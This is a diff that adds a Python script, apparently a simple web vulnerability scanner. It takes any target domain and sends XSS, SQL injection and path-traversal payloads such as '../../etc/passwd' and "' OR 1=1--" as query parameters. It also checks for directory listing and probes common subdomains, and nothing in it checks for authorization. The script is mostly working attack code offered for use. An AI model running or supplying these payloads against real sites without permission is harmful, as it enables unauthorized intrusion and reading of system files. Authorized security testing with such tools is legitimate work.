@@ -1,0 +1,106 @@
+import socket
+import requests
+
+def resolve_ip(domain):
+    print("\n[1] 🔍 Resolving IP...")
+    try:
+        ip = socket.gethostbyname(domain)
+        print(f"[+] IP of {domain}: {ip}")
+        return ip
+    except socket.gaierror as e:
+        print(f"[!] Failed to resolve domain: {e}")
+        return None
+
+def check_directory_listing(domain):
+    print("\n[2] 📂 Checking for directory listing...")
+    try:
+        url = f"http://{domain}/"
+        response = requests.get(url, timeout=5)
+        if "<title>Index of /" in response.text:
+            print(f"[+] Directory listing is enabled on {url}")
+        else:
+            print(f"[-] Directory listing not found.")
+    except requests.RequestException as e:
+        print(f"[!] Error checking directory listing: {e}")
+
+def test_xss(domain):
+    print("\n[3] 🧪 Testing for XSS...")
+    payloads = [
+        "<script>alert(1)</script>",
+        "\" onmouseover=\"alert(1)",
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>"
+    ]
+    for payload in payloads:
+        try:
+            url = f"http://{domain}/?q={payload}"
+            response = requests.get(url, timeout=5)
+            if payload in response.text:
+                print(f"[+] Possible XSS with payload: {payload}")
+            else:
+                print(f"[-] Payload not reflected: {payload}")
+        except requests.RequestException as e:
+            print(f"[!] Error with payload '{payload}': {e}")
+
+def test_sqli(domain):
+    print("\n[4] 🕳️ Testing for SQL Injection...")
+    payloads = [
+        "'",
+        "' OR '1'='1",
+        "';--",
+        "\" OR \"1\"=\"1",
+        "' OR 1=1--",
+        "' UNION SELECT NULL--"
+    ]
+    for payload in payloads:
+        try:
+            url = f"http://{domain}/?search={payload}"
+            response = requests.get(url, timeout=5)
+            if any(keyword in response.text.lower() for keyword in ["sql", "syntax", "mysql", "error"]):
+                print(f"[+] Possible SQLi with payload: {payload}")
+            else:
+                print(f"[-] Payload not reflected: {payload}")
+        except requests.RequestException as e:
+            print(f"[!] Error with payload '{payload}': {e}")
+
+def test_path_traversal(domain):
+    print("\n[5] 📁 Testing for Path Traversal...")
+    payloads = [
+        "../etc/passwd",
+        "../../etc/passwd",
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "../../../../../../windows/win.ini",
+        "..\\..\\..\\..\\windows\\win.ini"
+    ]
+    for payload in payloads:
+        try:
+            url = f"http://{domain}/?file={payload}"
+            response = requests.get(url, timeout=5)
+            if "root:x:" in response.text or "[extensions]" in response.text:
+                print(f"[+] Vulnerable to Path Traversal with payload: {payload}")
+            else:
+                print(f"[-] Attempt failed: {payload}")
+        except requests.RequestException as e:
+            print(f"[!] Error with payload '{payload}': {e}")
+
+def scan_subdomains(domain):
+    print("\n[6] 🌐 Scanning common subdomains...")
+    subdomains = ["www", "mail", "ftp", "admin", "test", "dev"]
+    for sub in subdomains:
+        full_domain = f"{sub}.{domain}"
+        try:
+            ip = socket.gethostbyname(full_domain)
+            print(f"[+] Found: {full_domain} -> {ip}")
+        except socket.gaierror:
+            print(f"[-] Not resolved: {full_domain}")
+
+if __name__ == "__main__":
+    domain = input("Enter the target domain (e.g., example.com): ").strip()
+    ip = resolve_ip(domain)
+    if ip:
+        check_directory_listing(domain)
+        test_xss(domain)
+        test_sqli(domain)
+        test_path_traversal(domain)
+        scan_subdomains(domain)
